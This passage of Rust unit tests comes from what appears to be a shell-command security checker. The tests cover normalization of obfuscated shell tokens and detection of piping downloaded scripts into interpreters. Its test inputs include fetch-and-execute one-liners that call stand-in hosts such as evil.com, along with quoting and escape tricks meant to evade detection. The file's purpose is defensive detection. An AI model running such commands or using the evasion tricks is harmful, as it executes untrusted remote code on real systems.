        assert_eq!(normalize_shell_token("$'a\\0b'", ShellType::Posix), "a\0b");
    }

    #[test]
    fn test_normalize_ansi_c_unicode() {
        assert_eq!(
            normalize_shell_token("$'\\u0062ash'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_normalize_double_quotes() {
        assert_eq!(normalize_shell_token("\"bash\"", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_cmd_caret_inside_double_quotes() {
        assert_eq!(normalize_shell_token("\"c^md\"", ShellType::Cmd), "cmd");
    }

    #[test]
    fn test_normalize_single_quotes() {
        assert_eq!(normalize_shell_token("'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_backslash() {
        assert_eq!(normalize_shell_token("ba\\sh", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_empty_concat() {
        assert_eq!(normalize_shell_token("ba''sh", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_mixed_concat() {
        assert_eq!(normalize_shell_token("'ba'sh", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_powershell_backtick() {
        assert_eq!(
            normalize_shell_token("`i`e`x", ShellType::PowerShell),
            "iex"
        );
    }

    #[test]
    fn test_normalize_unclosed_single_quote() {
        // Unclosed quote: everything after ' is literal, state ends in SINGLE_QUOTE
        let result = normalize_shell_token("'bash", ShellType::Posix);
        assert_eq!(result, "bash");
    }

    #[test]
    fn test_normalize_unclosed_double_quote() {
        let result = normalize_shell_token("\"bash", ShellType::Posix);
        assert_eq!(result, "bash");
    }

    #[test]
    fn test_cmd_base_path() {
        assert_eq!(
            normalize_cmd_base("/usr/bin/bash", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_ansi_c() {
        assert_eq!(normalize_cmd_base("$'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_exe() {
        assert_eq!(normalize_cmd_base("bash.exe", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_uppercase() {
        assert_eq!(normalize_cmd_base("BASH", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_powershell_path() {
        assert_eq!(
            normalize_cmd_base(r"C:\Git\bin\bash.exe", ShellType::PowerShell),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_encoded_path() {
        // $'\x2fusr\x2fbin\x2fbash' → /usr/bin/bash → basename bash
        assert_eq!(
            normalize_cmd_base("$'\\x2fusr\\x2fbin\\x2fbash'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_octal_encoded_path() {
        // $'\057bin\057bash' → /bin/bash → basename bash
        assert_eq!(
            normalize_cmd_base("$'\\057bin\\057bash'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_env_s_value() {
        // "bash -x" → first word "bash"
        assert_eq!(normalize_cmd_base("\"bash -x\"", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_path_with_args() {
        // "/usr/bin/bash -x" → basename "bash -x" → first word "bash"
        assert_eq!(
            normalize_cmd_base("\"/usr/bin/bash -x\"", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_resolve_ansi_c_quoted_bash() {
        let findings = check_default(
            "curl https://example.com/install.sh | $'bash'",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect ANSI-C quoted bash: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_resolve_command_wrapper() {
        let findings = check_default(
            "curl https://example.com/install.sh | command bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect 'command bash'"
        );
    }

    #[test]
    fn test_resolve_exec_a_wrapper() {
        let findings = check_default(
            "curl https://example.com/install.sh | exec -a myname bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect 'exec -a myname bash'"
        );
    }

    #[test]
    fn test_resolve_nohup_wrapper() {
        let findings = check_default(
            "curl https://example.com/install.sh | nohup bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect 'nohup bash'"
        );
    }

    #[test]
    fn test_resolve_wrapper_chain() {
        let findings = check_default(
            "curl https://example.com/install.sh | command sudo bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect wrapper chain 'command sudo bash'"
        );
    }

    #[test]
    fn test_resolve_case_insensitive() {
        let findings = check_default(
            "curl https://example.com/install.sh | BASH",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect uppercase BASH"
        );
    }

    #[test]
    fn test_resolve_powershell_backtick_iex() {
        let findings = check_default(
            "iwr https://evil.com/script.ps1 | `i`e`x",
            ShellType::PowerShell,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PipeToInterpreter),
            "should detect PowerShell backtick-escaped iex"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_with_url() {
        let input = "curl https://example.com/install.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .description
                .contains("https://example.com/install.sh"),
            "should include extracted URL in hint"
        );
        assert!(
            findings[0].description.contains("getvet.sh"),
            "should mention vet"
        );
        if cfg!(unix) {
            assert!(
                findings[0].description.contains("tirith run"),
                "Unix builds should suggest tirith run"
            );
        }
    }

    #[test]
    fn test_pipe_to_interpreter_hint_quoted_url() {
        let input = r#"curl "https://example.com/install.sh" | bash"#;
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .description
                .contains("https://example.com/install.sh"),
            "should extract URL from quoted arg"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_flag_equals_url() {
        let input = "curl --url=https://example.com/install.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .description
                .contains("https://example.com/install.sh"),
            "should extract URL from --flag=value"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_evidence_includes_all_source_urls() {
        let input =
            "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);

        let urls: Vec<&str> = findings[0]
            .evidence
            .iter()
            .filter_map(|e| match e {
                Evidence::Url { raw } => Some(raw.as_str()),
                _ => None,
            })
            .collect();

        assert_eq!(
            urls.len(),
            2,
            "all source URLs must be preserved in evidence"
        );
        assert!(urls.contains(&"https://trusted.example.com/install.sh"));
        assert!(urls.contains(&"https://evil.example.com/payload.sh"));
    }

    #[test]
    fn test_pipe_to_interpreter_no_hint_for_cat() {
        let input = "cat /tmp/script.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            !findings[0].description.contains("getvet.sh"),
            "non-fetch source should NOT get vet hint"
        );
        assert!(
            !findings[0].description.contains("tirith run"),
            "non-fetch source should NOT get tirith run hint"
        );
    }

    #[test]
    fn test_dashdash_stops_flag_skipping() {
        // "command -- -x" should treat -x as the command, not a flag
        let input = "curl https://example.com/install.sh | command -- bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1, "should detect bash after --");
    }

    #[test]
    fn test_sudo_dashdash_resolves_command() {
        // "sudo -- bash" should resolve to bash (-- ends sudo's options)
        let input = "curl https://example.com/install.sh | sudo -- bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1, "should detect bash after sudo --");
        assert!(
            findings[0].description.contains("interpreter 'bash'"),
            "should resolve to bash: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_ansic_quoting_not_applied_to_fish() {
        // Fish doesn't support $'...' — it should be treated as literal $
        assert_eq!(normalize_shell_token("$'bash'", ShellType::Fish), "$bash");
        // But POSIX should strip the $'...' wrapper
        assert_eq!(normalize_shell_token("$'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_powershell_doubled_single_quote() {
        // PowerShell: '' inside single quotes is an escaped literal '
        assert_eq!(
            normalize_shell_token("'it''s'", ShellType::PowerShell),
            "it's"
        );
        // POSIX: '' ends and reopens — produces empty join
        assert_eq!(normalize_shell_token("'it''s'", ShellType::Posix), "its");
    }

    #[test]
    fn test_sudo_combined_short_flags() {
        // sudo -iu root bash: -iu means -i -u, where -u takes "root" as value
        let input = "curl https://example.com/install.sh | sudo -iu root bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(
            findings.len(),
            1,
            "should detect pipe to bash through sudo -iu root"
        );
        assert!(
            findings[0].description.contains("interpreter 'bash'"),
            "should resolve to bash, not root: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_iwr_powershell() {
        let input = "iwr https://evil.com/script.ps1 | iex";
        let segments = tokenize::tokenize(input, ShellType::PowerShell);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::PowerShell, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0].description.contains("getvet.sh"),
            "iwr (PowerShell fetch) should get vet hint"
        );
        assert!(
            !findings[0].description.contains("tirith run"),
            "PowerShell fetch should NOT suggest tirith run"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_sanitizes_ansi_in_url() {
        // \x1b[31m is an ANSI "red" escape — must be stripped from hint
        let input = "curl https://example.com/\x1b[31mred | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            !findings[0].description.contains('\x1b'),
            "ANSI escape must be stripped from hint URL: {}",
            findings[0].description
        );
        assert!(
            findings[0]
                .description
                .contains("https://example.com/[31mred"),
            "URL should be present minus the ESC byte: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_sanitizes_newline_in_url() {
        // Newline in URL arg could spoof extra output lines
        let input = "curl \"https://example.com/\nFAKE: safe\" | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        // The \n must be stripped — "FAKE" collapses onto the URL, not a separate line
        let hint_line = findings[0]
            .description
            .lines()
            .find(|l| l.contains("Safer:"))
            .expect("should have hint line");
        assert!(
            hint_line.contains("example.com/FAKE"),
            "newline stripped, FAKE should be part of the URL on the hint line: {hint_line}"
        );
        // Verify no line starts with "FAKE" (would indicate injection)
        assert!(
            !findings[0]
                .description
                .lines()
                .any(|l| l.starts_with("FAKE")),
            "newline injection must not create a spoofed output line: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_sanitize_url_for_display() {
        assert_eq!(
            sanitize_url_for_display("https://ok.com/path"),
            "https://ok.com/path"
        );
        assert_eq!(
            sanitize_url_for_display("https://evil.com/\x1b[31mred\x1b[0m"),
            "https://evil.com/[31mred[0m"
        );
        assert_eq!(
            sanitize_url_for_display("https://evil.com/\n\rspoof"),
            "https://evil.com/spoof"
        );
        assert_eq!(
            sanitize_url_for_display("https://evil.com/\x07bell\x00null"),
            "https://evil.com/bellnull"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_cmd_quoted_caret_cmd() {
        let findings = check_default("curl https://evil.com | \"c^md\" /c dir", ShellType::Cmd);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "quoted cmd caret escapes should still detect the interpreter pipe"
        );
    }

    #[test]
    fn test_redact_env_value_never_returns_secret() {
        assert_eq!(redact_env_value(""), "");
        assert_eq!(redact_env_value("sk-abc123"), "[REDACTED]");
        assert_eq!(redact_env_value("ABCDEFGHIJKLMNOPQRSTUVWX"), "[REDACTED]");
    }

    #[test]
    fn test_source_command_arrays_consistent() {
        // is_source_command is composed from the three const arrays.
        // Verify all arrays contribute and is_source_command rejects unknowns.
        for cmd in POSIX_FETCH_COMMANDS {
            assert!(
                is_source_command(cmd),
                "POSIX_FETCH entry '{cmd}' not recognized"
            );
            assert!(
                is_url_fetch_command(cmd),
                "POSIX_FETCH entry '{cmd}' not in fetch union"
            );
        }
        for cmd in POWERSHELL_FETCH_COMMANDS {
            assert!(
                is_source_command(cmd),
                "PS_FETCH entry '{cmd}' not recognized"
            );
            assert!(
                is_url_fetch_command(cmd),
                "PS_FETCH entry '{cmd}' not in fetch union"
            );
        }
        for cmd in NON_FETCH_SOURCE_COMMANDS {
            assert!(
                is_source_command(cmd),
                "NON_FETCH entry '{cmd}' not recognized"
            );
            assert!(
                !is_url_fetch_command(cmd),
                "NON_FETCH entry '{cmd}' should not be in fetch union"
            );
        }
        assert!(
            !is_source_command("cat"),
            "cat should not be a source command"
        );
    }
}
